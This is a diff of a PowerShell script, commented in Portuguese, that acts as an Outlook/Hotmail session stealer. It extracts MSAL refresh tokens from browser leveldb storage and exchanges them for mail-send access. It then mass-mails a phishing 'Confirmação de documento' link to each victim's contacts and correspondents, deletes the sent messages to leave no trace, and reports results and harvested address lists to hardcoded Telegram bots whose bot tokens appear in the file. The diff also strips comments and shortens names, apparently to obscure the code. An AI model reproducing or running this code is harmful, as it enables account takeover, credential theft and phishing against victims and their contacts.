@@ -1,100 +1,39 @@
 ﻿#Requires -Version 5.1
-<#
-rehot.ps1 — detector + sender de sessões OWA/Hotmail (port do rehot.py).
 
-Só .NET Framework (Windows PowerShell 5.1). Sem dependências externas.
-
-Fluxo:
-  1. Enumera navegadores (Chrome/Edge/Brave/Opera/Opera GX) e TODOS os perfis.
-  2. Sinal de sessão: cookie MSPAuth/MSPSec em .live.com (busca crua no banco Cookies).
-  3. Extrai o refresh token MSAL do Local Storage/leveldb (descomprimindo blocos
-     SNAPPY — o mesmo truque do Python). O refresh real está em "secret".
-  4. O refresh token e o client sao extraidos do leveldb do PC onde roda (NAO
-     hardcoded). Troca por token READ e WRITE (tentando os clients de mail do
-     OWA conhecidos, com o client descoberto como fallback) e valida via REST
-     API v2.0 /me.
-  5. Decisão: qual perfil usar; se houver mais de um, usa todos.
-  6. -SendTo <email>: envia um e-mail de teste.
-
-Uso:
-  powershell -File rehot.ps1                 # só detecta
-  powershell -File rehot.ps1 -SendTo a@b.com # detecta + envia teste
-  powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes (libera perfis travados)
-
-  Corpo da mensagem (todos os modos de envio):
-    -Body  : corpo da mensagem. Aceita texto puro OU HTML pronto. Se vazio, usa
-             o template HTML padrão (campanha atual, com o link do documento).
-    -Link  : link curto que substitui [LINK_CURTO] no corpo (template ou -Body).
-    -Subject: assunto. Se vazio, usa "Confirmação de documento".
-    -ShowJson: imprime o JSON exato enviado (validar "ContentType":"HTML" e o
-               href escapado antes de conferir o e-mail no Outlook).
-    Texto puro é embrulado em HTML e as quebras viram <br>; HTML pronto passa
-    intacto. O envio sempre sai com ContentType "HTML" (API v2.0).
-  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" [-MaxContacts 50]
-      # lista a agenda do cliente e envia a mensagem designada a todos os contatos
-  powershell -File rehot.ps1 -ToAllPeople -Subject "Oi" -Body "msg" [-MaxMessages 2000]
-      # envia a TODAS as pessoas (contatos + quem ja trocou mail, via Inbox/Enviados)
-  powershell -File rehot.ps1 -ToAllRecipients -Subject "Oi" -Body "msg" [-MaxMessages 2000]
-      # agenda + TODOS os destinatários do histórico de Enviados (To/Cc/Bcc) — subconjunto de -ToAllPeople (sem Inbox)
-  powershell -File rehot.ps1 -ToAllPeople -DryRun
-      # so lista os destinatarios (nao envia) — preview/teste seguro
-  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" -SelfDelete
-      # idem + apaga as mensagens enviadas (por assunto) da pasta Enviados
-  powershell -File rehot.ps1 -SelfDeleteAll   # apaga TUDO em Enviados (rastro zero)
-
-  Reporte via Telegram (padrao: bot ja configurado; -NoTelegram desliga):
-  cada execucao envia p/ o chat um resumo com o nome da maquina, o veredito
-  (OK/ERRO), a quantidade de emails enviados e, se houve falha, o erro por
-  destinatario. P/ rodar em varios PCs ao mesmo tempo, basta o mesmo comando:
-  os relatorios chegam separados no chat, um por maquina.
-#>
 param(
     [string]$SendTo = "",
     [switch]$NoValidate,
     [switch]$CloseBrowsers,
-    [switch]$ToAllContacts,   # envia a mensagem designada para TODOS os contatos da agenda
-    [switch]$ToAllPeople,     # envia para TODAS as pessoas (contatos + historico de Inbox/Enviados)
-    [switch]$ToAllRecipients, # agenda + To/Cc/Bcc da pasta Enviados (SUBCONJUNTO de -ToAllPeople: NAO inclui Inbox; use quando o alvo é só quem você já enviou e-mail)
-    [string]$Subject = "",    # assunto da mensagem (vazio = padrão de teste)
-    [string]$Body = "",       # corpo da mensagem (vazio = template HTML padrão)
-    [string]$Link = "",       # link curto p/ substituir [LINK_CURTO] no corpo
-    [switch]$ShowJson,        # imprime o JSON exato enviado (validar ContentType=HTML + href)
-    [int]$MaxContacts = 0,    # trava de segurança: 0 = sem limite (total de destinatarios)
-    [int]$MaxMessages = 0,    # -ToAllPeople: max de mensagens escaneadas p/ extrair enderecos (0 = tudo)
-    [switch]$DryRun,          # lista os destinatarios sem enviar (preview/teste)
-    [switch]$SelfDelete,      # após enviar, apaga as mensagens desta execução (por assunto)
-    [switch]$SelfDeleteAll,   # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
-    [string]$TelegramToken = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",  # token do bot (vazio = sem reporte)
-    [string]$TelegramChatId = "6168636325,8725655293",                          # chat_id(s) de destino do reporte (separados por virgula)
-    [switch]$NoTelegram,     # desliga o reporte via Telegram
-    [string]$ListaToken  = "8623526001:AAGa0-cXzKzn20FpJQp1VskjgjUMXY5PW7Q",
-    [string]$ListaChatId = "6168636325,8725655293"   # chat_id(s) de destino da lista (separados por virgula)
+    [switch]$ToAllContacts,
+    [switch]$ToAllPeople,
+    [switch]$ToAllRecipients,
+    [string]$Subject = "",
+    [string]$Body = "",
+    [string]$Link = "",
+    [switch]$ShowJson,
+    [int]$MaxContacts = 0,
+    [int]$MaxMessages = 0,
+    [switch]$DryRun,
+    [switch]$SelfDelete,
+    [switch]$SelfDeleteAll,
+    [string]$TgTok = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",
+    [string]$TelegramChatId = "6168636325,8725655293",
+    [switch]$NoTelegram,
+    [string]$ListaTok  = "8623526001:AAGa0-cXzKzn20FpJQp1VskjgjUMXY5PW7Q",
+    [string]$ListaChatId = "6168636325,8725655293"
 )
 
 $ErrorActionPreference = "Stop"
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
-# ---------------- constantes ----------------
 $APPDATA      = $env:APPDATA
 $LOCALAPPDATA = $env:LOCALAPPDATA
-# Client IDs do OWA = registros de app da Microsoft (iguais em TODO PC; NAO sao
-# segredo do PC). O que varia por PC e o REFRESH TOKEN, extraido do leveldb do
-# navegador (Get-MSALToken). O client descoberto no leveldb tem prioridade; as
-# listas abaixo sao fallback conhecido p/ quando o PC usar outro client do OWA.
-$OWA_KNOWN_CLIENTIDS      = @("9199bf20-a13f-4107-85dc-02114787ef48")  # SPA do OWA (read)
-$OWA_KNOWN_MAIL_CLIENTIDS = @("6bc89243-be1c-423a-99ec-b9a45b8b568b")  # API de mail (write)
+$OWA_KNOWN_CLIENTIDS      = @("9199bf20-a13f-4107-85dc-02114787ef48")
+$OWA_KNOWN_MAIL_CLIENTIDS = @("6bc89243-be1c-423a-99ec-b9a45b8b568b")
 $OWA_READ_SCOPE  = "https://outlook.office.com/.default"
-$OWA_TOKEN_URL   = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
-# API OWA v2.0 (endpoint REST do Outlook Web App). Propriedades em PascalCase
-# (Body, ContentType, Content) e SaveToSentItems como string 'true' — idêntico à
-# documentação oficial. v2.0 está descontinuada mas ainda responde em muitos
-# tenants; se o endpoint parar, a migração é para Microsoft Graph
-# (POST /me/sendMail, body.contentType: "HTML" em camelCase): trocar a URL e o
-# case das propriedades.
+$OWA_TK_URL   = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 $OWA_API_BASE    = "https://outlook.office.com/api/v2.0"
 $OWA_ORIGIN      = "https://outlook.live.com"
-# Corpo HTML padrão (campanha atual): follow-up de orçamento. O link e o nome do
-# documento sao fixos no corpo (sem [LINK_CURTO]). Sem CSS, sem imagem, sem senha.
 $DEFAULT_HTML_BODY = @'
 <html><head>
     <meta charset="UTF-8">
@@ -105,7 +44,6 @@ $DEFAULT_HTML_BODY = @'
 
 </body></html>
 '@
-# Assunto padrão (instrução 3): o e-mail é uma "confirmação de documento".
 $DEFAULT_SUBJECT = "Confirmação de documento"
 
 $browsers = @(
@@ -116,15 +54,14 @@ $browsers = @(
     @{ Name = "Opera GX";   Root = Join-Path $APPDATA "Opera Software\Opera GX Stable" }
 )
 
-# ---------------- leitura de arquivo (mesmo travado) ----------------
-$script:_FileIOReady = $false
-function Ensure-FileIO {
-    if ($script:_FileIOReady) { return }
+$script:_FIOReady = $false
+function Ensure-FIO {
+    if ($script:_FIOReady) { return }
     $sig = @'
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
-public static class FileIO {
+public static class FIO {
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sec, uint d, uint f, IntPtr t);
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -145,19 +82,16 @@ public static class FileIO {
 }
 '@
     try { Add-Type -TypeDefinition $sig } catch {}
-    $script:_FileIOReady = $true
+    $script:_FIOReady = $true
 }
 
-# ---------------- snappy em C# (rápido) ----------------
-# O loop byte-a-byte do PowerShell é ~650x mais lento que C#. Compilamos um
-# helper via Add-Type que faz o walk + descompressão de todo o arquivo .ldb.
-$script:_SnappyReady = $false
-function Ensure-Snappy {
-    if ($script:_SnappyReady) { return }
+$script:_SnapReady = $false
+function Ensure-Snap {
+    if ($script:_SnapReady) { return }
     $sig = @'
 using System;
 using System.IO;
-public static class SnappyLdb {
+public static class SnapDec {
     static int ReadVarint(byte[] d, int pos, out int val) {
         int result = 0, shift = 0;
         while (true) {
@@ -224,7 +158,7 @@ public static class SnappyLdb {
             return declared;
         } catch { consumed = 0; return -1; }
     }
-    public static byte[] DecompressFile(byte[] data) {
+    public static byte[] Run(byte[] data) {
         if (data == null || data.Length < 48) return null;
         ulong magic = BitConverter.ToUInt64(data, data.Length - 8);
         if (magic != 0x88328E1720020B68UL && magic != 0xDB4775248B80FB57UL) return null;
@@ -250,16 +184,15 @@ public static class SnappyLdb {
 }
 '@
     try { Add-Type -TypeDefinition $sig } catch {}
-    $script:_SnappyReady = $true
+    $script:_SnapReady = $true
 }
 
 function Read-FileBytes([string]$path) {
     try { return [System.IO.File]::ReadAllBytes($path) } catch {}
-    Ensure-FileIO
-    return [FileIO]::ReadAll($path)
+    Ensure-FIO
+    return [FIO]::ReadAll($path)
 }
 
-# ---------------- snappy (port do leveldb_scan.py) ----------------
 function Read-Varint([byte[]]$buf, [ref]$pos) {
     $result = [int64]0
     $shift = 0
@@ -273,7 +206,6 @@ function Read-Varint([byte[]]$buf, [ref]$pos) {
 }
 
 function Expand-Snappy([byte[]]$src, [int]$start) {
-    # retorna [PSCustomObject]@{Out;Consumed} ou $null se inválido
     $pos = $start
     $n = Read-Varint $src ([ref]$pos)
     if ($n -le 0 -or $n -gt (1 -shl 22)) { return $null }
@@ -283,7 +215,7 @@ function Expand-Snappy([byte[]]$src, [int]$start) {
         while ($pos -lt $src.Length -and $outLen -lt $n) {
             $tag = $src[$pos]; $pos++
             $t = $tag -band 3
-            if ($t -eq 0) {                       # literal
+            if ($t -eq 0) {
                 $l = ($tag -shr 2) + 1
                 if ($l -gt 60) {
                     $nb = $l - 60
@@ -295,21 +227,21 @@ function Expand-Snappy([byte[]]$src, [int]$start) {
                 [Array]::Copy($src, $pos, $out, $outLen, $l)
                 $pos += $l; $outLen += $l
             }
-            elseif ($t -eq 1) {                   # copy, offset 1 byte
+            elseif ($t -eq 1) {
                 $l = (($tag -shr 2) -band 0x7) + 4
                 $off = (($tag -shr 5) -shl 8) -bor $src[$pos]; $pos++
                 if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                 else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                 $outLen += $l
             }
-            elseif ($t -eq 2) {                   # copy, offset 2 bytes
+            elseif ($t -eq 2) {
                 $l = ($tag -shr 2) + 1
                 $off = $src[$pos] -bor ($src[$pos + 1] -shl 8); $pos += 2
                 if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                 else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                 $outLen += $l
             }
-            else {                                # copy, offset 4 bytes
+            else {
                 $l = ($tag -shr 2) + 1
                 $off = $src[$pos] -bor ($src[$pos + 1] -shl 8) -bor ($src[$pos + 2] -shl 16) -bor ($src[$pos + 3] -shl 24)
                 $pos += 4
@@ -323,18 +255,14 @@ function Expand-Snappy([byte[]]$src, [int]$start) {
     return [PSCustomObject]@{ Out = $out; Consumed = $pos }
 }
 
-function Get-LeveldbBlob([string]$path) {
+function Get-LdbBlob([string]$path) {
     $data = Read-FileBytes $path
     if (-not $data -or $data.Length -lt 48) { return $null }
-    # caminho rápido: descompressão em C# (Add-Type) — ~650x mais rápido que o loop PS
-    Ensure-Snappy
+    Ensure-Snap
     try {
-        $blob = [SnappyLdb]::DecompressFile($data)
+        $blob = [SnapDec]::Run($data)
         if ($blob) { return $blob }
     } catch {}
-    # fallback: walk em PowerShell (lento, mas funciona sem Add-Type)
-    # ToInt64 (não ToUInt64): os literais hex > Int64max são parseados como Int64
-    # negativo no PowerShell, então o magic precisa ser lido como Int64 p/ bater.
     $magic = [BitConverter]::ToInt64($data, $data.Length - 8)
     if ($magic -ne 0x88328E1720020B68 -and $magic -ne 0xDB4775248B80FB57) { return $null }
     $p = $data.Length - 48
@@ -354,10 +282,7 @@ function Get-LeveldbBlob([string]$path) {
     return $ms.ToArray()
 }
 
-# ---------------- MSAL: extrai refresh token + client ----------------
-# Busca grants de refresh token num texto bruto (blob descomprimido de .ldb ou
-# bytes crus de .log). Retorna lista de @{ refresh; client; stamp }.
-function Get-MSALTokensInText([string]$text) {
+function Get-MSALTksInText([string]$text) {
     $found = @()
     if (-not $text) { return $found }
     $searchStart = 0
@@ -374,18 +299,12 @@ function Get-MSALTokensInText([string]$text) {
                     $stamp = [int64]0
                     if ($obj.lastUpdatedAt) { $stamp = [int64]$obj.lastUpdatedAt }
                     elseif ($obj.expiresOn) { $stamp = [int64]$obj.expiresOn }
-                    $found += @{ refresh = $obj.secret; client = $obj.clientId; stamp = $stamp }
+                    $found += @{ rtk = $obj.secret; client = $obj.clientId; stamp = $stamp }
                 }
             } catch {}
         }
         $searchStart = $idx + 1
     }
-    # FALLBACK FUZZY: registro corrompido — credentialType truncado por byte NULL
-    # (ex.: "Refr<N>" em vez de "RefreshToken"), campos garbled. Acontece quando o
-    # leveldb compacta com um write parcial. O secret continua presente como a
-    # string base64url mais longa do registro; o clientId pode estar garbled,
-    # entao usamos o client OWA conhecido como fallback. Sem isto, o PC fica
-    # "LOGADO_SESSAO_VIVA" mas "msal=false" (false negative do cliente).
     if ($found.Count -eq 0) {
         $fs = 0
         while (($idx = $text.IndexOf('"credentialType":"Refr', $fs)) -ge 0) {
@@ -401,7 +320,7 @@ function Get-MSALTokensInText([string]$text) {
                     $client = ""
                     if ($clean -match '"clientId":"([a-f0-9\-]{36})"') { $client = $Matches[1] }
                     if (-not $client) { $client = $OWA_KNOWN_CLIENTIDS[0] }
-                    $found += @{ refresh = $longest; client = $client; stamp = [int64]0; fuzzy = $true }
+                    $found += @{ rtk = $longest; client = $client; stamp = [int64]0; fuzzy = $true }
                 }
             }
             $fs = $idx + 1
@@ -410,31 +329,19 @@ function Get-MSALTokensInText([string]$text) {
     return $found
 }
 
-# ---------------- MSAL: extrai refresh token + client ----------------
-function Get-MSALToken([string]$leveldbDir) {
-    if (-not (Test-Path $leveldbDir)) { return $null }
-    # O leveldb guarda VARIOS refresh tokens (historico de logins). O mais NOVO
-    # (maior lastUpdatedAt) e o valido; o antigo costuma estar expirado
-    # (AADSTS70000). Coletamos TODOS e so no fim escolhemos o mais fresco,
-    # priorizando o client conhecido do OWA.
-    #
-    # Duas fontes: (1) *.ldb — blocos SNAPPY descomprimidos; (2) *.log — o WAL
-    # (write-ahead log). Gravações RECENTES (login feito agora, ou o navegador
-    # matado com -CloseBrowsers ANTES de compactar) ficam no .log e NAO em
-    # nenhum .ldb ainda. Ler so .ldb deixava esses tokens de fora — o caso
-    # "Outlook logado mas sem_perfil_com_token". O .log e lido CRU (sem snappy):
-    # o valor JSON ja esta em texto claro dentro dos registros do log.
+function Get-MSALTk([string]$ldir) {
+    if (-not (Test-Path $ldir)) { return $null }
     $all = @()
-    foreach ($f in (Get-ChildItem $leveldbDir -Filter *.ldb -ErrorAction SilentlyContinue)) {
-        $blob = Get-LeveldbBlob $f.FullName
+    foreach ($f in (Get-ChildItem $ldir -Filter *.ldb -ErrorAction SilentlyContinue)) {
+        $blob = Get-LdbBlob $f.FullName
         if ($blob -and $blob.Length -gt 0) {
-            $all += Get-MSALTokensInText ([System.Text.Encoding]::ASCII.GetString($blob))
+            $all += Get-MSALTksInText ([System.Text.Encoding]::ASCII.GetString($blob))
         }
     }
-    foreach ($f in (Get-ChildItem $leveldbDir -Filter *.log -ErrorAction SilentlyContinue)) {
+    foreach ($f in (Get-ChildItem $ldir -Filter *.log -ErrorAction SilentlyContinue)) {
         $bytes = Read-FileBytes $f.FullName
         if ($bytes -and $bytes.Length -gt 0) {
-            $all += Get-MSALTokensInText ([System.Text.Encoding]::ASCII.GetString($bytes))
+            $all += Get-MSALTksInText ([System.Text.Encoding]::ASCII.GetString($bytes))
         }
     }
     $best = $null; $bestStamp = [int64]0
@@ -442,11 +349,11 @@ function Get-MSALToken([string]$leveldbDir) {
     foreach ($t in $all) {
         if ($OWA_KNOWN_CLIENTIDS -contains $t.client) {
             if ($t.stamp -ge $bestStamp) {
-                $best = @{ refresh = $t.refresh; client = $t.client }
+                $best = @{ rtk = $t.rtk; client = $t.client }
                 $bestStamp = $t.stamp
             }
         } elseif ($t.stamp -ge $fallbackStamp) {
-            $fallback = @{ refresh = $t.refresh; client = $t.client }
+            $fallback = @{ rtk = $t.rtk; client = $t.client }
             $fallbackStamp = $t.stamp
         }
     }
@@ -454,7 +361,6 @@ function Get-MSALToken([string]$leveldbDir) {
     return $fallback
 }
 
-# ---------------- cookies (sinal de sessão, busca crua) ----------------
 function Test-MSCookies([string]$profileDir) {
     $net    = Join-Path $profileDir "Network\Cookies"
     $legacy = Join-Path $profileDir "Cookies"
@@ -468,22 +374,14 @@ function Test-MSCookies([string]$profileDir) {
     return @{ state = "ok"; ms = $ms; outlook = $outlook }
 }
 
-# ---------------- HTTP: troca / validação / envio ----------------
 function UrlEnc([string]$s) { [System.Uri]::EscapeDataString($s) }
 
-# $script:LastExchangeError guarda o motivo da última troca que falhou (p/
-# diagnosticar "msal=true mas token_read=null" — ex.: refresh revogado, MFA, rede).
 $script:LastExchangeError = $null
-function Exchange-OWAToken([string]$refresh, [string]$client, [string]$scope) {
+function Exchange-OWATk([string]$rtk, [string]$client, [string]$scope) {
     $script:LastExchangeError = $null
-    $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $refresh)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
-    # HttpWebRequest (nao Invoke-WebRequest): o IWR 5.1 consome o corpo da resposta
-    # antes do catch, deixando o erro vazio. Aqui capturamos status + corpo de
-    # verdade (ex.: AADSTS70000 = grant expirado, usuario precisa entrar de novo).
-    # Tudo dentro do try: falha de rede no GetRequestStream nao pode derrubar o
-    # script inteiro ($ErrorActionPreference=Stop).
+    $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $rtk)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
     try {
-        $req = [System.Net.HttpWebRequest]::Create($OWA_TOKEN_URL)
+        $req = [System.Net.HttpWebRequest]::Create($OWA_TK_URL)
         $req.Method = "POST"
         $req.ContentType = "application/x-www-form-urlencoded"
         $req.Headers.Add("Origin", $OWA_ORIGIN)
@@ -513,10 +411,6 @@ function Exchange-OWAToken([string]$refresh, [string]$client, [string]$scope) {
     }
 }
 
-# Traduz o erro bruto da troca em uma dica acionavel (p/ o log se auto-explicar
-# quando o token nao valida). AADSTS70000 = grant expirado (entrar de novo no
-# Outlook resolve); invalid_grant = revogado/rotacionado; 50120/50020 = MFA ou
-# politica de sign-in; sem codigo HTTP = falha de rede.
 function Get-ExchangeErrorHint([string]$err) {
     if (-not $err) { return "troca sem erro capturado" }
     if ($err -match "AADSTS70000") { return "refresh token EXPIRADO (AADSTS70000) — entre de novo no Outlook/OWA no navegador para renovar" }
@@ -529,9 +423,9 @@ function Get-ExchangeErrorHint([string]$err) {
     return "erro na troca do token — verifique o corpo do erro"
 }
 
-function Test-OWAToken([string]$token) {
+function Test-OWATk([string]$tk) {
     try {
-        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
         $j = $resp.Content | ConvertFrom-Json
         $email = $j.EmailAddress
         if ($email -is [System.Management.Automation.PSCustomObject]) { $email = $email.Address }
@@ -544,29 +438,20 @@ function Test-OWAToken([string]$token) {
     }
 }
 
-# Adquire token WRITE (Mail.Send) para o refresh token do PC onde roda.
-# O client que FAZ a troca e sempre o dono do refresh token ($client, descoberto
-# no leveldb); o que varia e o scope (api://<mailClient>/.default). Tenta, em
-# ordem: os clients de mail conhecidos do OWA e, por fim, o proprio client
-# descoberto (caso ele mesmo carregue Mail.Send). Retorna @{ token; mailClient;
-# email } do primeiro que validar via /me, ou $null.
-function Get-OWAWriteToken([string]$refresh, [string]$client) {
+function Get-OWAWriteTk([string]$rtk, [string]$client) {
     $candidates = @($OWA_KNOWN_MAIL_CLIENTIDS) + @($client)
     foreach ($mc in ($candidates | Select-Object -Unique)) {
         if (-not $mc) { continue }
-        $tok = Exchange-OWAToken $refresh $client "api://$mc/.default"
+        $tok = Exchange-OWATk $rtk $client "api://$mc/.default"
         if (-not $tok) { continue }
-        $v = Test-OWAToken $tok
+        $v = Test-OWATk $tok
         if ($v.state -eq "valido") {
-            return @{ token = $tok; mailClient = $mc; email = $v.email }
+            return @{ tk = $tok; mailClient = $mc; email = $v.email }
         }
     }
     return $null
 }
 
-# Converte o corpo em HTML (instrucao 1): se ja contem marcacao (<letra), envia
-# como esta; senao, embrulha num envelope minimo e converte quebras de linha em
-# <br>. Assim -Body aceita texto puro OU HTML pronto.
 function ConvertTo-HtmlBody([string]$body) {
     if (-not $body) { $body = "" }
     if ($body -match '<[a-zA-Z]') { return $body }
@@ -575,20 +460,14 @@ function ConvertTo-HtmlBody([string]$body) {
     return "<html><body>$html</body></html>"
 }
 
-# Resolve o corpo final: usa -Body se fornecido, senão o template HTML padrão.
-# Substitui [LINK_CURTO] por -Link (se fornecido). O corpo já sai HTML (via
-# ConvertTo-HtmlBody no Send-OWAMail), então aqui só escolhemos o texto-base.
 function Resolve-Body([string]$body, [string]$link) {
     $final = if ($body) { $body } else { $DEFAULT_HTML_BODY }
     if ($link) { $final = $final.Replace('[LINK_CURTO]', $link) }
     return $final
 }
 
-function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$body) {
+function Send-OWAMsg([string]$tk, [string]$to, [string]$subject, [string]$body) {
     $content = ConvertTo-HtmlBody $body
-    # Payload v2.0 (instrucao 3): PascalCase + Body.ContentType = HTML.
-    # SaveToSentItems como string 'true' e ConvertTo-Json -Compress seguem o
-    # trecho de referencia. -Depth 10 evita truncar ToRecipients[0].EmailAddress.Address.
     $payload = @{
         Message = @{
             Subject      = $subject
@@ -598,17 +477,11 @@ function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$bo
         SaveToSentItems = 'true'
     }
     $json = $payload | ConvertTo-Json -Depth 10 -Compress
-    # Validacao: imprime o JSON exato que vai no ar (confirme "ContentType":"HTML"
-    # e o href escapado). Opt-in p/ nao poluir o modo -ToAll* (centenas de envios).
     if ($ShowJson) { Write-Host "[JSON] $json" }
-    # corpo como byte[] UTF-8: o Windows PowerShell 5.1 codifica string no charset
-    # do sistema (Windows-1252), o que corrompe acentos e quebra o JSON (400).
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     try {
-        # Invoke-RestMethod (instrucao 3): 202 com corpo vazio nao lanca; falha
-        # (4xx/5xx) lanca WebException com .Response — capturamos status + corpo.
         $resp = Invoke-RestMethod -Method Post -Uri "$OWA_API_BASE/me/sendMail" `
-            -Headers @{ "Authorization" = "Bearer $token"; "Origin" = $OWA_ORIGIN } `
+            -Headers @{ "Authorization" = "Bearer $tk"; "Origin" = $OWA_ORIGIN } `
             -ContentType "application/json; charset=utf-8" -Body $bytes
         return @{ ok = $true; status = 202; erro = $null }
     } catch {
@@ -625,14 +498,9 @@ function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$bo
     }
 }
 
-# ---------------- Telegram: reporte por máquina ----------------
-# O cliente roda o MESMO comando em vários PCs ao mesmo tempo; cada execução
-# dispara um resumo para o bot (token/chat_id fixos por padrão). O envio vai em
-# try/catch: falha no Telegram NAO derruba o envio (que ja aconteceu) — vira
-# apenas o campo "telegram" no JSON de saida.
-function Send-TelegramMessage([string]$token, [string]$chatId, [string]$text) {
-    if (-not $token -or -not $chatId) { return @{ ok = $false; erro = "token/chat_id vazio" } }
-    $url = "https://api.telegram.org/bot$token/sendMessage"
+function Send-TgMsg([string]$tk, [string]$chatId, [string]$text) {
+    if (-not $tk -or -not $chatId) { return @{ ok = $false; erro = "token/chat_id vazio" } }
+    $url = "https://api.telegram.org/bot$tk/sendMessage"
     $payload = @{ chat_id = $chatId; text = $text; disable_web_page_preview = $true } | ConvertTo-Json -Depth 4
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
     try {
@@ -650,10 +518,6 @@ function Send-TelegramMessage([string]$token, [string]$chatId, [string]$text) {
     }
 }
 
-# Monta o texto do reporte a partir do objeto final ($out). Prioridade:
-# -ToAllContacts/-ToAllPeople (envio_todos) > -SendTo (envio) > somente deteccao.
-# Mostra: máquina, conta, veredito OK/PARCIAL/ERRO, qtd enviados e (se houver)
-# os erros por destinatario — o suficiente p/ triagem em massa de vários PCs.
 function Build-ReportText($out) {
     $L = @()
     $L += "📧 EnvioHOT — $($out.maquina)"
@@ -663,9 +527,6 @@ function Build-ReportText($out) {
         $L += "👤 $conta"
         if ($et.status) {
             $L += "🔴 ERRO — $($et.status)"
-            # Mostra o MOTIVO (a decisao): ex. "troca do refresh FALHOU -> token
-            # EXPIRADO", "arquivos travados (navegador aberto)", "NENHUMA sessao".
-            # Sem isso o cliente so via "sem_perfil_com_token" e nao sabia por que.
             if ($out.decisao) {
                 $motivo = $out.decisao
                 if ($motivo.Length -gt 300) { $motivo = $motivo.Substring(0, 300) + "…" }
@@ -700,8 +561,6 @@ function Build-ReportText($out) {
                 if ($falhas.Count -gt 10) { $L += "   … e mais $($falhas.Count - 10) falha(s)" }
             }
             if ($et.limite_atingido) {
-                # trava disparou (429 limite OU 403 suspensa): avisa o motivo e quantos
-                # nao foram nem tentados (total - enviados - falhas; o erro ja esta em falhas).
                 $naoTentados = $et.total - $et.enviados - $falhas.Count
                 $motivoTrava = if ($et.erro_trava) { $et.erro_trava } else { "Limite diário atingido (HTTP 429)" }
                 $L += "   ⏸️ $motivoTrava — $($naoTentados) destinatário(s) NÃO tentado(s)"
@@ -724,10 +583,6 @@ function Build-ReportText($out) {
     return ($L -join "`n")
 }
 
-# Bot de lista: a cada execucao (cliente/remetente), envia ao SEGUNDO bot o
-# email do remetente + todos os emails enviados + os que NAO foram enviados
-# (falhas e os que a trava de limite impediu de tentar), p/ o usuario montar a
-# lista de destinatarios por remetente.
 function Build-ListaText([string]$remetente, [array]$enviados, [array]$naoEnviados) {
     $L = @()
     $L += "📋 LISTA — remetente: $remetente"
@@ -744,16 +599,12 @@ function Build-ListaText([string]$remetente, [array]$enviados, [array]$naoEnviad
     return ($L -join "`n")
 }
 
-# ---------------- agenda de contatos (GET /me/contacts, paginado) ----------------
-# Usa o MESMO token OWA (READ scope) que valida via /me — nao precisa de novo
-# consent. Retorna array de @{ name; email } (primeiro endereco de cada contato
-# que tenha e-mail). Contatos sem email (so telefone, por ex.) sao descartados.
-function Get-OWAContacts([string]$token) {
+function Get-OWAContacts([string]$tk) {
     $result = @()
     $uri = "$OWA_API_BASE/me/contacts?`$top=200"
     while ($uri) {
         try {
-            $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+            $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
         } catch { return $result }
         $j = $resp.Content | ConvertFrom-Json
         if ($j.value) {
@@ -768,13 +619,10 @@ function Get-OWAContacts([string]$token) {
     return $result
 }
 
-# Descobre o id da pasta de Enviados. Na API v2.0 NAO existe /me/sentitems — so
-# chega pela pasta via /me/mailFolders/{id}. O nome varia por locale, por isso
-# casamos contra uma lista de variantes conhecidas.
-function Get-OWASentFolderId([string]$token) {
+function Get-OWASentFolderId([string]$tk) {
     $names = @("sent items", "sent", "itens enviados", "enviados", "elementos enviados", "éléments envoyés", "envoyés", "gesendete elemente", "elementi inviati")
     try {
-        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/mailFolders?`$top=100" -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/mailFolders?`$top=100" -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
     } catch { return $null }
     $j = $resp.Content | ConvertFrom-Json
     if ($j.value) {
@@ -787,18 +635,11 @@ function Get-OWASentFolderId([string]$token) {
     return $null
 }
 
-# ---------------- todas as pessoas (contatos + historico de mensagens) ----------------
-# Nao basta a agenda: muita gente com quem o cliente troca mail NAO esta salva como
-# contato. Coletamos enderecos unicos de: (1) contatos, (2) Inbox e (3) Enviados
-# (From/To/Cc/Bcc de cada mensagem). $maxMessages limita o escaneamento (0 = tudo).
-# O proprio endereco ($selfEmail) e filtrado. Retorna array de @{ name; email }
-# (email em minusculas; nome = displayName se vier de contato, senao o proprio email).
-function Get-OWAAllPeople([string]$token, [string]$selfEmail, [int]$maxMessages) {
